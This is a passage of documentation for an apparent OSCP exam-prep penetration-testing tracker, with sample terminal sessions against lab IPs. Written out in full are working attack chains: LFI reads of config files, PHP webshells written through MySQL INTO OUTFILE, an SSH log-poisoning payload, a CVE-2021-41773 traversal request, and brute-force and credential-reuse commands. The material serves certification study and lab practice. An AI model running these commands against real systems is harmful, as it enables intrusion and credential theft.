  gobuster-80 → manual-http-80 (findings needed)
  nmap-scan → whatweb-80 (port must be confirmed)

Execution order:
  1. nmap-scan (no dependencies)
  2. Parallel: gobuster-80, whatweb-80
  3. manual-http-80 (after gobuster completes)
```

**Error Handling**:
```bash
# Continue on error or stop?
[crack-track] > be 1-5 --on-error continue

⏱ Executing tasks...
  ✓ Task 1 completed
  ✗ Task 2 failed (continuing)
  ✓ Task 3 completed
  ✓ Task 4 completed
  ✓ Task 5 completed

Results:
  ✓ Success: 4/5
  ✗ Failed: 1/5 (use 'tr' to retry)
```

**Pro Tips**:
- Filter before batching: `tf` → `be`
- Use `--preview` to see execution plan
- Parallel execution saves significant time
- Dependency resolution prevents failures
- Combine with smart confirmation mode for speed

---

#### Finding Correlator (fc)
**Shortcut**: `fc`
**Value**: Identify attack chains
**Time Saved**: ~3 minutes vs manual analysis

**Purpose**: Automatic correlation of findings to identify multi-step attack chains and credential reuse opportunities.

**Correlation Types**:

**1. Credential Reuse**:
```bash
[crack-track] > fc

Finding Correlator Analysis
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔑 CREDENTIAL REUSE OPPORTUNITIES (High Priority)

Found credential: admin:P@ssw0rd (source: HTTP config.js)

Untested services:
  → Port 22 (SSH)      [HIGH PRIORITY]
  → Port 445 (SMB)     [HIGH PRIORITY]
  → Port 3306 (MySQL)  [MEDIUM PRIORITY]

Suggested commands:
  ssh admin@192.168.45.100
  smbclient //192.168.45.100/C$ -U admin%P@ssw0rd
  mysql -h 192.168.45.100 -u admin -p'P@ssw0rd'

Execute credential tests? [Y/n]: y
⏱ Testing SSH... ✗ Failed (auth error)
⏱ Testing SMB... ✓ SUCCESS! (access granted)
⏱ Testing MySQL... ✓ SUCCESS! (connected)

🎯 Credential reuse successful on 2/3 services!
```

**2. Attack Chain Discovery**:
```bash
[crack-track] > fc

🔗 ATTACK CHAIN IDENTIFIED (Confidence: 85%)

Chain: LFI → Config File → Database Access → Shell

Step 1: Local File Inclusion
  • Finding: LFI in page.php (source: manual testing)
  • Location: http://192.168.45.100/page.php?file=

Step 2: Config File Exposure
  • Finding: Config location known (/var/www/html/config.php)
  • Action: Use LFI to read config

Step 3: Database Credentials
  • Expected: MySQL credentials in config.php
  • Action: Extract credentials

Step 4: Database Access
  • Port 3306 is open (MySQL detected)
  • Action: Connect with extracted credentials

Step 5: Code Execution
  • MySQL has FILE privilege (likely)
  • Action: Write PHP shell via INTO OUTFILE

Exploitation Path:
  curl http://target/page.php?file=../../../var/www/html/config.php
  → Extract MySQL creds
  → mysql -h target -u user -p'pass'
  → SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/shell.php'
  → curl http://target/shell.php?c=id

Execute attack chain? [y/N]: n
✓ Attack chain documented for manual execution
```

**3. Port Correlation**:
```bash
[crack-track] > fc

🌐 PORT CORRELATION INSIGHTS

Discovered pattern: Development/Staging Environment
  • Port 80: Apache 2.4.41 (production)
  • Port 8080: Apache 2.4.41 (likely staging)
  • Port 8888: Apache 2.4.41 (likely dev)

Recommendation:
  Check ports 8080, 8888 for:
    → Weak/default credentials
    → Debug modes enabled
    → Source code exposure
    → Outdated dependencies

Suggested tasks:
  curl http://192.168.45.100:8080/
  gobuster dir -u http://192.168.45.100:8080 -w common.txt
  nikto -h http://192.168.45.100:8080
```

**4. Version Correlation**:
```bash
[crack-track] > fc

🔍 VERSION CORRELATION

Same software across multiple services:
  • Port 80: Apache 2.4.29 (Ubuntu)
  • Port 22: OpenSSH 7.6 (Ubuntu)

OS Fingerprint: Ubuntu 18.04 LTS (Bionic)

Known CVEs for this combination:
  • CVE-2021-3156 (sudo heap overflow) - OSCP:HIGH
  • CVE-2021-41773 (Apache path traversal) - OSCP:HIGH

Exploit suggestions:
  searchsploit ubuntu 18.04
  searchsploit apache 2.4.29
  searchsploit openssh 7.6
```

**Pro Tips**:
- Run `fc` after each enumeration phase
- Focus on high-confidence chains first
- Credential reuse is most reliable attack vector
- Document attack chains even if not executing
- Use findings for OSCP report evidence section

---

#### Success Analyzer (sa)
**Shortcut**: `sa`
**Value**: Task success rate analysis

**Purpose**: Analyze historical success rates of different task types to optimize future workflows.

**Dashboard**:
```bash
[crack-track] > sa

Success Analyzer - Historical Performance
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Overall Statistics (across 5 targets):
  Total tasks executed: 142
  Success rate: 68% (97/142)
  Average time per task: 8m 30s

By Task Type:
  gobuster         ████████████████░░░░  85% (17/20)  [HIGH VALUE]
  nikto            ████░░░░░░░░░░░░░░░░  20% (4/20)   [LOW VALUE]
  enum4linux       ████████████████░░░░  80% (12/15)  [HIGH VALUE]
  manual-http      ███████████████████░  95% (19/20)  [HIGHEST VALUE]
  searchsploit     ████████░░░░░░░░░░░░  40% (8/20)   [MEDIUM VALUE]
  smbclient        ███████████░░░░░░░░░  55% (11/20)  [MEDIUM VALUE]

By Service:
  HTTP (80/443)    ██████████████░░░░░░  70% (35/50)
  SMB (445)        ████████████░░░░░░░░  60% (18/30)
  SSH (22)         ████████████████████  100% (20/20)  [RELIABLE]
  MySQL (3306)     ████████░░░░░░░░░░░░  40% (6/15)

Insights:
  ✓ Manual HTTP testing most reliable (95%)
  ✗ Nikto rarely finds vulnerabilities (20%)
  ✓ SSH enumeration always succeeds (100%)
  → Optimize: Prioritize manual over automated web scanning
  → Optimize: Skip nikto on time-limited targets
  → Optimize: Always run SSH enumeration (guaranteed results)

Recommended Workflow Adjustments:
  1. Replace nikto with manual testing
  2. Increase manual-http time allocation
  3. Run SSH tasks early (high success, quick)
  4. Deprioritize searchsploit (better after manual enum)
```

**Detailed Analysis**:
```bash
# Analyze specific tool
[crack-track] > sa gobuster

Gobuster Analysis (20 executions):
  Success rate: 85% (17/20)
  Average time: 8m 15s
  Findings per success: 3.2

Success factors:
  ✓ Common.txt wordlist: 90% success
  ✗ Big.txt wordlist: 40% success (too slow)
  ✓ -x php,txt extensions: 85% success
  ✗ No extensions: 60% success

Optimization:
  → Use common.txt (not big.txt)
  → Always include -x php,txt,html
  → Set --timeout 30s

Updated template:
  gobuster dir -u <URL> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html --timeout 30
```

**Failure Analysis**:
```bash
# Why do tasks fail?
[crack-track] > sa --failures

Common Failure Reasons:
  1. Timeouts (32%)
     • Most common: nikto, sqlmap
     • Fix: Add --timeout flags, reduce threads

  2. Wrong wordlists (24%)
     • Most common: gobuster, wfuzz
     • Fix: Use common.txt not big.txt

  3. Service not vulnerable (20%)
     • Most common: searchsploit, nikto
     • Note: Expected, not a true failure

  4. Auth required (12%)
     • Most common: smbclient, mysql
     • Fix: Run after credential discovery

  5. Network issues (12%)
     • Most common: Exam VPN drops
     • Fix: Test connection first, add retries
```

**Export Insights**:
```bash
# Export optimization report
[crack-track] > sa --export optimization_report.md

✓ Exported optimization insights to optimization_report.md

# Share with team/mentor
[crack-track] > sa --export --format json
✓ Exported machine-readable stats to success_stats.json
```

**Pro Tips**:
- Run `sa` after completing 3+ targets
- Use insights to update workflow recordings
- Focus on tools with >70% success rate
- Document low-success tools as "optional"
- Share insights with study group

---

### 5.5 Expert Pattern-Matching Tools

#### Workflow Recorder (wr)
**Shortcut**: `wr`
**Value**: Record/replay task sequences
**Time Saved**: ~20 minutes on 2nd+ target

**Purpose**: Record successful task sequences and replay them on subsequent targets with variable substitution.

**Recording Workflow**:
```bash
# Start recording
[crack-track] > wr start web-enum-workflow
✓ Recording started: web-enum-workflow

# Execute tasks normally
[crack-track] > execute whatweb-80
✓ Task completed
📹 Recorded: whatweb http://192.168.45.100

[crack-track] > execute gobuster-80
✓ Task completed
📹 Recorded: gobuster dir -u http://192.168.45.100 -w common.txt

[crack-track] > execute manual-http-80
✓ Task completed
📹 Recorded: manual-http-80

# Stop recording
[crack-track] > wr stop
✓ Recording stopped

Workflow Summary:
  Name: web-enum-workflow
  Steps: 3
  Duration: 25m 30s
  Success rate: 100%

Save workflow? [Y/n]: y
✓ Workflow saved: web-enum-workflow
```

**Replaying Workflow**:
```bash
# List available workflows
[crack-track] > wr list
Available workflows:
  1. web-enum-workflow      (3 steps, 25m, 100% success)
  2. smb-full-enum          (5 steps, 15m, 80% success)
  3. linux-privesc-enum     (8 steps, 30m, 90% success)

# Replay on new target
[crack-track] > wr play web-enum-workflow

Workflow: web-enum-workflow (3 steps)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Variable substitution:
  OLD_TARGET: 192.168.45.100
  NEW_TARGET: 192.168.45.101

  Enter values:
    NEW_TARGET [192.168.45.101]: 192.168.45.101
    LHOST [auto-detected: 192.168.45.5]:

Replay plan:
  1. whatweb http://192.168.45.101
  2. gobuster dir -u http://192.168.45.101 -w common.txt
  3. manual-http (interactive)

Estimated time: 25 minutes
Execute workflow? [Y/n]: y

⏱ Step 1/3: whatweb http://192.168.45.101
[output...]
✓ Completed (2m 15s)

⏱ Step 2/3: gobuster dir -u http://192.168.45.101 -w common.txt
[output...]
✓ Completed (18m 30s)

⏱ Step 3/3: manual-http
[interactive manual testing guidance]
✓ Completed (5m 00s)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Workflow Results:
  ✓ All steps completed successfully
  ⏱ Total time: 25m 45s (estimated: 25m 00s)
  📊 Success rate: 100%

Update workflow success rate? [Y/n]: y
✓ Workflow updated (success rate: 100%, 2/2 executions)
```

**Workflow Editing**:
```bash
# Edit workflow before replay
[crack-track] > wr edit web-enum-workflow

Current steps:
  1. whatweb http://<TARGET>
  2. gobuster dir -u http://<TARGET> -w common.txt
  3. manual-http

Modify workflow:
  [a]dd step, [d]elete step, [e]dit step, [r]eorder, [s]ave, [q]uit: a

Add step at position: 3

Command: nikto -h http://<TARGET>

Updated workflow:
  1. whatweb http://<TARGET>
  2. gobuster dir -u http://<TARGET> -w common.txt
  3. nikto -h http://<TARGET>  [NEW]
  4. manual-http

Save changes? [Y/n]: y
✓ Workflow updated
```

**Advanced Features**:

**Conditional Steps**:
```bash
# Steps can have conditions
Step 3: enum4linux -a <TARGET>
  Condition: port 445 open
  Action if skipped: Continue to next step

Step 4: smbclient //<TARGET>/C$ -U <USER>
  Condition: credentials available
  Action if skipped: Prompt for credentials
```

**Parallel Execution**:
```bash
# Workflows can execute tasks in parallel
Workflow: full-enum (parallel optimization)

  Parallel group 1:
    • whatweb http://<TARGET>
    • ssh-keyscan <TARGET>
    • enum4linux <TARGET>

  Parallel group 2 (after group 1):
    • gobuster (if HTTP)
    • smbmap (if SMB)

  Sequential:
    • manual-review (after all automated)
```

**Pro Tips**:
- Record first target workflow, replay on rest
- Use descriptive workflow names
- Include variable placeholders: `<TARGET>`, `<LHOST>`, `<PORT>`
- Edit workflows to optimize based on `sa` insights
- Share workflows with team/study group
- Exam strategy: Record successful enumeration, replay on all boxes

---

#### Smart Suggest (sg)
**Shortcut**: `sg`
**Value**: Pattern-based suggestions
**Time Saved**: ~2 minutes per suggestion

**Purpose**: AI-lite pattern matching to suggest overlooked attack vectors and next steps based on current enumeration state.

**Suggestion Categories**:

**1. Missed Opportunities**:
```bash
[crack-track] > sg

Smart Suggestions - 192.168.45.100
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔍 MISSED OPPORTUNITIES

1. Port 3306 (MySQL) has no enumeration tasks
   → Suggested: Test default credentials
   → Command: mysql -h 192.168.45.100 -u root -p
   → Confidence: HIGH (common attack vector)

2. Port 445 (SMB) open but no share enumeration
   → Suggested: Enumerate shares
   → Command: smbclient -L //192.168.45.100 -N
   → Confidence: HIGH (quick win)

3. Port 80 has /admin directory but no brute-force attempt
   → Suggested: Brute-force admin login
   → Command: hydra -l admin -P rockyou.txt 192.168.45.100 http-post-form "/admin/login.php:user=^USER^&pass=^PASS^:F=incorrect"
   → Confidence: MEDIUM (time-consuming)

Execute suggestions? [y/N]: y
Select: 1,2
```

**2. Version-Based Exploits**:
```bash
[crack-track] > sg

💣 EXPLOIT SUGGESTIONS

1. Apache 2.4.29 detected (Port 80)
   → CVE-2021-41773: Path traversal
   → Exploit: curl http://192.168.45.100/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
   → OSCP Relevance: HIGH
   → Confidence: 85% (exact version match)

2. OpenSSH 7.6 detected (Port 22)
   → CVE-2018-15473: Username enumeration
   → Tool: ssh-audit
   → OSCP Relevance: MEDIUM
   → Confidence: 60% (info disclosure only)

Test exploits? [y/N]: y
```

**3. Credential Suggestions**:
```bash
[crack-track] > sg

🔑 CREDENTIAL ATTACK SUGGESTIONS

1. No credential attempts on MySQL (Port 3306)
   → Default creds: root:(empty), admin:admin
   → Brute-force: hydra -l root -P passwords.txt mysql://192.168.45.100

2. HTTP form at /admin/login.php detected
   → Common credentials: admin:admin, admin:password
   → SQL injection: test id parameter with ' OR 1=1--

3. SMB null session might work (Samba 4.0)
   → Command: rpcclient -U "" 192.168.45.100
   → Enumerate users: enumdomusers
```

**4. Next Step Recommendations**:
```bash
[crack-track] > sg

📍 RECOMMENDED NEXT STEPS

Based on current findings:

1. LFI discovered in page.php
   → Next: Attempt RCE via log poisoning
   → Method: SSH login with PHP payload in username
   → Payload: ssh '<?php system($_GET["c"]); ?>'@192.168.45.100
   → Then: Access via page.php?file=/var/log/auth.log&c=id

2. MySQL credentials found (dbuser:Pass123!)
   → Next: Check for FILE privilege
   → Command: mysql -h 192.168.45.100 -u dbuser -p'Pass123!' -e "SELECT file_priv FROM mysql.user WHERE user='dbuser'"
   → If YES: Write webshell via INTO OUTFILE

3. Writable SMB share found (/backup)
   → Next: Upload malicious SCF file
   → Capture hash: Responder
   → Crack with hashcat

Priority order: 1 → 2 → 3 (highest to lowest impact)
```

**5. Pattern Recognition**:
```bash
[crack-track] > sg

🧠 PATTERN ANALYSIS

Detected pattern: Typical OSCP Web Application Box

Checklist completion:
  ✓ Port scan (completed)
  ✓ Web enumeration (completed)
  ✓ Directory brute-force (completed)
  ✓ Vulnerability scan (completed)
  ✗ Source code review (MISSING)
  ✗ Parameter fuzzing (MISSING)
  ✗ File upload testing (MISSING)

Missing steps that often lead to exploitation:
  1. Download and review source code
     → Look for: Hard-coded credentials, SQL queries, file paths

  2. Fuzz GET/POST parameters
     → Tools: wfuzz, ffuf
     → Look for: Hidden parameters, SQLi, LFI

  3. Test file upload functionality
     → Bypass: Double extensions, MIME type spoofing
     → Shell: PHP, ASPX, JSP

Suggested workflow:
  wget -r -np http://192.168.45.100/
  grep -r "password" .
  wfuzz -w params.txt -u http://192.168.45.100/page.php?FUZZ=test
```

**Confidence Levels**:
- **HIGH (80-100%)**: Strong evidence, reliable vector
- **MEDIUM (50-79%)**: Reasonable chance, worth testing
- **LOW (<50%)**: Speculative, test if time permits

**Pro Tips**:
- Run `sg` when stuck or unsure of next step
- Focus on HIGH confidence suggestions first
- Suggestions learn from your success patterns
- Use after each enumeration phase
- Combines with `fc` for comprehensive analysis

---

## 6. OSCP Exam Workflows

### Workflow 1: Initial Target Enumeration
**Time**: 30 minutes (full methodology)
**Outcome**: Complete service enumeration, identified attack vectors

```bash
# Step 1: Create target and import scan (2 min)
crack track new 192.168.45.100
crack track import 192.168.45.100 nmap-full.xml

# Step 2: Enter interactive mode
crack track -i 192.168.45.100

# Step 3: Check progress and plan (1 min)
[crack-track] > pd
# Shows: 15 tasks generated, 80% pending

# Step 4: Execute quick wins first (10 min)
[crack-track] > tf tag:QUICK_WIN status:pending
# Shows: 5 quick win tasks

[crack-track] > be --filter "tag:QUICK_WIN"
# Executes: whatweb, ssh-keyscan, robots.txt, etc.

# Step 5: Batch execute port-specific enum (15 min)
[crack-track] > be --filter "port:80 status:pending"
# Executes: gobuster, nikto, manual checks

[crack-track] > be --filter "port:445 status:pending"
# Executes: enum4linux, smbclient, smbmap

# Step 6: Correlation analysis (2 min)
[crack-track] > fc
# Identifies: Attack chains, credential reuse, missed opportunities

# Step 7: Document findings (continuous)
[crack-track] > qn Found admin panel at /dashboard
[crack-track] > qn SMB null session works - enumerating users
[crack-track] > finding
# Type: vulnerability
# Description: Directory traversal in download.php
# Source: curl http://target/download.php?file=../../../etc/passwd

# Result: Complete enumeration in 30 minutes
```

### Workflow 2: Multi-Target Speed Run
**Time**: 5 minutes per target (after first)
**Outcome**: 70% faster enumeration using workflow recording

```bash
# TARGET 1: First box (establish workflow)
crack track -i 192.168.45.100

# Record successful workflow
[crack-track] > wr start oscp-web-enum
[crack-track] > execute whatweb-80
[crack-track] > execute gobuster-80
[crack-track] > execute nikto-80
[crack-track] > execute manual-http-80
[crack-track] > wr stop
# Saved: oscp-web-enum workflow

# TARGETS 2-4: Replay workflow
crack track new 192.168.45.101
crack track import 192.168.45.101 nmap-scan.xml
crack track -i 192.168.45.101

[crack-track] > wr play oscp-web-enum
# Auto-substitutes target IP
# Executes all 4 steps automatically
# Time: 5 minutes vs 30 minutes = 83% faster!

# Repeat for targets 3 and 4
# Total time: 30min + (3 × 5min) = 45 minutes for 4 targets
# vs 30min × 4 = 120 minutes = 75 minutes saved
```

### Workflow 3: Report Preparation
**Time**: 10 minutes per target
**Outcome**: OSCP-compliant documentation with all sources

```bash
# Enter interactive mode
crack track -i 192.168.45.100

# Step 1: Review all findings (2 min)
[crack-track] > fc
# Shows: All findings with correlations

# Step 2: Verify source tracking (1 min)
[crack-track] > qx findings --preview
# Check: All findings have documented sources

# Step 3: Export findings (1 min)
[crack-track] > qx findings
✓ Exported to: findings_192.168.45.100.md

# Step 4: Export command history (1 min)
[crack-track] > qx commands
✓ Exported to: commands_192.168.45.100.txt

# Step 5: Export timeline (1 min)
[crack-track] > qx timeline
✓ Exported to: timeline_192.168.45.100.md

# Step 6: Export full status (1 min)
[crack-track] > qx status
✓ Exported to: status_192.168.45.100.md

# Step 7: Review and format (3 min)
# Open exported files
# Copy to OSCP report template
# Verify all requirements met

# Result: Complete documentation in 10 minutes
```

### Workflow 4: Credential Discovery Chain
**Time**: 15 minutes
**Outcome**: Identify and test all credential opportunities

```bash
# Step 1: Check for credentials in findings (1 min)
[crack-track] > grep -i "password\|credential\|user" notes
# or
[crack-track] > fc
# Focus on credential findings

# Step 2: Test credential reuse (5 min)
[crack-track] > fc
# Shows: Credential reuse opportunities

# Suppose found: admin:P@ssw0rd in config.php

# System suggests:
# → Test on SSH (port 22)
# → Test on SMB (port 445)
# → Test on MySQL (port 3306)

# Execute batch credential test
[crack-track] > be --credential-test admin:P@ssw0rd
⏱ Testing SSH... ✗ Failed
⏱ Testing SMB... ✓ SUCCESS!
⏱ Testing MySQL... ✓ SUCCESS!

# Step 3: Document credential access (2 min)
[crack-track] > qn SMB access with admin:P@ssw0rd (from config.php)
[crack-track] > qn MySQL access with admin:P@ssw0rd

# Step 4: Enumerate accessible services (7 min)
[crack-track] > qe smbclient //192.168.45.100/C$ -U admin%P@ssw0rd
[crack-track] > qe mysql -h 192.168.45.100 -u admin -p'P@ssw0rd' -e "show databases;"

# Result: 2 credential hits, full access documented
```

### Workflow 5: Attack Chain Execution
**Time**: 20 minutes
**Outcome**: Multi-step exploitation based on correlation

```bash
# Step 1: Identify attack chain (2 min)
[crack-track] > fc

# Example output:
# Chain: LFI → Config → MySQL → Shell
#   Step 1: Use LFI to read config.php
#   Step 2: Extract MySQL credentials
#   Step 3: Connect to MySQL
#   Step 4: Write webshell via INTO OUTFILE

# Step 2: Execute chain systematically (15 min)

# Chain Step 1: LFI to read config
[crack-track] > qe curl http://192.168.45.100/page.php?file=../../../var/www/html/config.php
# Output shows: $db_user = "dbuser"; $db_pass = "Pass123!";

# Document
[crack-track] > qn Found MySQL creds in config.php: dbuser:Pass123!
[crack-track] > finding
# Type: information
# Description: MySQL credentials in config.php
# Source: LFI via page.php?file=../../../var/www/html/config.php

# Chain Step 2: Test MySQL access
[crack-track] > qe mysql -h 192.168.45.100 -u dbuser -p'Pass123!'
# Success!

# Chain Step 3: Check FILE privilege
[crack-track] > qe mysql -h 192.168.45.100 -u dbuser -p'Pass123!' -e "SELECT file_priv FROM mysql.user WHERE user='dbuser'"
# file_priv: Y

# Chain Step 4: Write webshell
[crack-track] > qe mysql -h 192.168.45.100 -u dbuser -p'Pass123!' -e "SELECT '<?php system(\$_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'"

# Chain Step 5: Verify shell
[crack-track] > qe curl http://192.168.45.100/shell.php?c=id
# uid=33(www-data) gid=33(www-data)

# Step 3: Document breakthrough (3 min)
[crack-track] > finding
# Type: vulnerability
# Description: LFI to RCE via MySQL INTO OUTFILE
# Source: LFI → config.php → MySQL FILE privilege → webshell

[crack-track] > ss breakthrough-shell
# Save snapshot before post-exploitation

# Result: Complete attack chain executed and documented
```

### Workflow 6: Time-Constrained Exam Endgame
**Time**: Last 2 hours of exam
**Outcome**: Maximize points with limited time

```bash
# Scenario: 2 hours left, 2 targets partial, 1 untouched

# Step 1: Time check (30 sec)
[crack-track] > tt --exam-mode 120
✓ Exam countdown: 2h 0m remaining

# Step 2: Quick triage (2 min)
# Check all targets
crack track -i 192.168.45.100
[crack-track] > pd --summary
# Progress: 60% (shell obtained, need privesc)

crack track -i 192.168.45.101
[crack-track] > pd --summary
# Progress: 40% (enumerated, no shell)

crack track -i 192.168.45.102
[crack-track] > pd --summary
# Progress: 0% (not started)

# Step 3: Prioritize based on success analyzer (3 min)
[crack-track] > sa
# Shows: Manual testing 95% success, automated 40% success
# Decision: Focus on manual vectors

# Step 4: Target 100 - Quick privesc attempt (30 min)
crack track -i 192.168.45.100
[crack-track] > tf tag:PRIVESC status:pending
[crack-track] > be --filter "tag:PRIVESC tag:QUICK_WIN"
# Try: sudo -l, SUID, capabilities
# Result: Found SUID binary, got root!

[crack-track] > qn ROOT via SUID /usr/bin/custom_binary
[crack-track] > qx timeline
✓ Exported for report

# Step 5: Target 101 - Focus on high-value findings (45 min)
crack track -i 192.168.45.101
[crack-track] > fc
# Shows: Potential SQLi in id parameter

[crack-track] > qe sqlmap -u "http://192.168.45.101/page.php?id=1" --risk 3 --level 5 --batch
# Result: SQL injection confirmed, dumped credentials

[crack-track] > fc
# Shows: Credential reuse opportunity on SSH

[crack-track] > qe ssh user@192.168.45.101
# Success! Got shell

[crack-track] > tf tag:PRIVESC
[crack-track] > be --filter "tag:QUICK_WIN"
# Result: Got root via sudo misconfiguration

# Step 6: Target 102 - Skip or quick scan (30 min)
# Time check: 45 min left
[crack-track] > tt
# Exam time: 45m remaining

crack track new 192.168.45.102
crack track import 192.168.45.102 quick-scan.xml
crack track -i 192.168.45.102

# Use workflow replay for speed
[crack-track] > wr play oscp-web-enum
# Result: Enumeration completed in 15 minutes

[crack-track] > fc
# Shows: Default credentials on port 8080

[crack-track] > qe curl http://admin:admin@192.168.45.102:8080/admin
# Success! Admin panel access

[crack-track] > sg
# Suggests: File upload vulnerability

[crack-track] > qe [test file upload with PHP shell]
# Result: Shell obtained!

# Final 15 minutes: Document and export all
[crack-track] > qx findings
[crack-track] > qx timeline
[crack-track] > qx commands

# Result: 3 targets compromised in 2 hours (prioritization + tools)
```

---

## 7. Tool Integration Examples

### Integration Example 1: SMB Enumeration to Exploitation

**Scenario**: Port 445 open, found username 'admin' in HTTP response

```bash
# Step 1: Finding Correlator identifies opportunity
[crack-track] > fc

Finding Correlator:
  🔑 Credential hint: Username 'admin' found in HTTP response
  🌐 Port 445 (SMB) is open
  💡 Suggestion: Try SMB with discovered username

# Step 2: Quick Execute to test
[crack-track] > qe smbclient //192.168.45.100/C$ -U admin
# Password: [try empty, admin, password]
# Success with password "admin"!

# Step 3: Quick Note to document
[crack-track] > qn SMB access with admin:admin (username from HTTP, password guessed)

# Step 4: Command History to retrieve for report
[crack-track] > ch smbclient
# Shows: smbclient //192.168.45.100/C$ -U admin%admin

# Step 5: Export for documentation
[crack-track] > qx findings
✓ Finding exported with complete source trail
```

**Value**: Identified credential reuse opportunity, tested in <2 minutes, fully documented

---

### Integration Example 2: LFI to RCE via Log Poisoning

**Scenario**: LFI vulnerability discovered, need RCE

```bash
# Step 1: Document LFI finding
[crack-track] > finding
Type: vulnerability
Description: Local File Inclusion in page.php
Source: Manual testing: curl http://192.168.45.100/page.php?file=../../../etc/passwd

# Step 2: Smart Suggest for next steps
[crack-track] > sg

Smart Suggestions:
  💣 LFI to RCE Opportunities:
    1. Log poisoning (SSH auth.log)
    2. Session file poisoning (/var/lib/php/sessions)
    3. proc/self/environ injection

  Recommended: Log poisoning (high success rate)

# Step 3: Use Command Template for payload
[crack-track] > x
Template: SSH log poisoning payload
Command: ssh '<?php system($_GET["c"]); ?>'@<TARGET>

Enter <TARGET>: 192.168.45.100

Final: ssh '<?php system($_GET["c"]); ?>'@192.168.45.100

Execute? [y/N]: y
# This fails to authenticate (expected) but poisons log

# Step 4: Quick Execute to trigger RCE
[crack-track] > qe curl "http://192.168.45.100/page.php?file=/var/log/auth.log&c=id"
# Output: uid=33(www-data) gid=33(www-data)

# Step 5: Document complete chain
[crack-track] > finding
Type: vulnerability
Description: LFI to RCE via SSH log poisoning
Source: LFI (page.php) + log poisoning (/var/log/auth.log) + command execution

# Step 6: Session Snapshot before privilege escalation
[crack-track] > ss before-privesc-attempt
✓ Snapshot created

# Result: Complete attack chain in 10 minutes
```

**Tool Flow**: Finding → Smart Suggest → Template → Quick Execute → Document → Snapshot

---

### Integration Example 3: Multi-Service Credential Testing

**Scenario**: Found credentials, need to test across all services

```bash
# Step 1: Credential discovered
[crack-track] > qn Found credentials in config.js: admin:P@ssw0rd123

# Step 2: Add to credential store
[crack-track] > credential
Username: admin
Password: P@ssw0rd123
Service: http
Port: 80
Source: Found in /assets/js/config.js

# Step 3: Finding Correlator suggests reuse
[crack-track] > fc

Credential Reuse Analysis:
  Found: admin:P@ssw0rd123 (HTTP)

  Untested services:
    → SSH (22)      [HIGH PRIORITY]
    → SMB (445)     [HIGH PRIORITY]
    → MySQL (3306)  [MEDIUM PRIORITY]

  Batch test available

# Step 4: Batch Execute credential tests
[crack-track] > be --credential-test admin:P@ssw0rd123

Testing credentials on 3 services...
  ⏱ SSH (22)...     ✓ SUCCESS! (shell access)
  ⏱ SMB (445)...    ✗ Failed (access denied)
  ⏱ MySQL (3306)... ✓ SUCCESS! (database access)

Results: 2/3 services accessible

# Step 5: Quick Note for successful access
[crack-track] > qn SSH shell with admin:P@ssw0rd123
[crack-track] > qn MySQL access with admin:P@ssw0rd123

# Step 6: Progress Dashboard shows impact
[crack-track] > pd

Credentials:
  admin:P@ssw0rd123 → SSH ✓, MySQL ✓, SMB ✗

# Step 7: Export comprehensive report
[crack-track] > qx findings

Findings Export:
  - Credentials: admin:P@ssw0rd123 (Source: config.js)
  - SSH Access: Confirmed (Source: ssh admin@target)
  - MySQL Access: Confirmed (Source: mysql -h target -u admin)

# Result: 3 services tested in 2 minutes, 2 access vectors documented
```

**Tool Flow**: Quick Note → Credential → Correlator → Batch Execute → Progress → Export

---

### Integration Example 4: Workflow Optimization Loop

**Scenario**: Optimize enumeration based on success data

```bash
# After completing 3 targets...

# Step 1: Success Analyzer identifies patterns
[crack-track] > sa

Success Analysis:
  gobuster:     85% success (17/20)
  nikto:        20% success (4/20)   ← LOW VALUE
  manual-http:  95% success (19/20)  ← HIGH VALUE

Recommendation: Replace nikto with manual testing

# Step 2: Filter current pending tasks
[crack-track] > tf tool:nikto status:pending

Found 5 nikto tasks (est. 25 minutes)

# Step 3: Skip low-value tasks
[crack-track] > tf tool:nikto --skip
✓ Marked 5 nikto tasks as skipped

# Step 4: Focus on high-value manual tasks
[crack-track] > tf tag:MANUAL status:pending

Found 8 manual testing tasks

# Step 5: Batch execute high-value tasks
[crack-track] > be --filter "tag:MANUAL"
Execute 8 manual tasks? [Y/n]: y

# Step 6: Update workflow recording
[crack-track] > wr edit oscp-web-enum

Current workflow:
  1. whatweb
  2. gobuster
  3. nikto         ← REMOVE (low success)
  4. manual-http

Updated workflow:
  1. whatweb
  2. gobuster
  3. manual-http   ← Prioritized
  4. parameter-fuzz ← Added

Save? [Y/n]: y

# Step 7: Use optimized workflow on next target
[crack-track] > wr play oscp-web-enum
# Executes optimized workflow (no nikto, faster completion)

# Result: 25% time savings per target through data-driven optimization
```

**Tool Flow**: Success Analyzer → Task Filter → Skip/Prioritize → Update Workflow → Replay

---

### Integration Example 5: Rapid Triage Mode (Exam Pressure)

**Scenario**: 30 minutes left, need to check all low-hanging fruit

```bash
# Step 1: Set exam countdown
[crack-track] > tt --exam-mode 30
⚠️ EXAM MODE: 30 minutes remaining

# Step 2: Filter for quick wins only
[crack-track] > tf tag:QUICK_WIN status:pending

Quick Wins (6 tasks, est. 15 minutes):
  1. robots-txt-80      (30 sec)
  2. ssh-default-creds  (1 min)
  3. mysql-anonymous    (1 min)
  4. smb-null-session   (2 min)
  5. default-admin-panel (1 min)
  6. common-files-80    (2 min)

# Step 3: Change to never-confirm mode for speed
[crack-track] > c
Select mode: 3 (never)
⚠️ All tasks will execute without confirmation

# Step 4: Batch execute all quick wins
[crack-track] > be 1-6

⏱ Executing 6 quick wins...
  ✓ robots-txt-80        Found: /admin, /backup
  ✗ ssh-default-creds    Failed
  ✓ mysql-anonymous      SUCCESS! Anonymous access
  ✓ smb-null-session     Enumerated 3 users
  ✓ default-admin-panel  Found at /dashboard
  ✓ common-files-80      Found: /config.bak

Results: 5/6 successful (15m 30s)

# Step 5: Smart Suggest on findings
[crack-track] > sg

High-Priority Actions (15 min remaining):
  1. Download /config.bak (might have credentials)
  2. Try admin panel with default creds
  3. MySQL anonymous → check for FILE privilege

# Step 6: Quick Execute critical tests
[crack-track] > qe curl http://192.168.45.100/config.bak -o config.bak
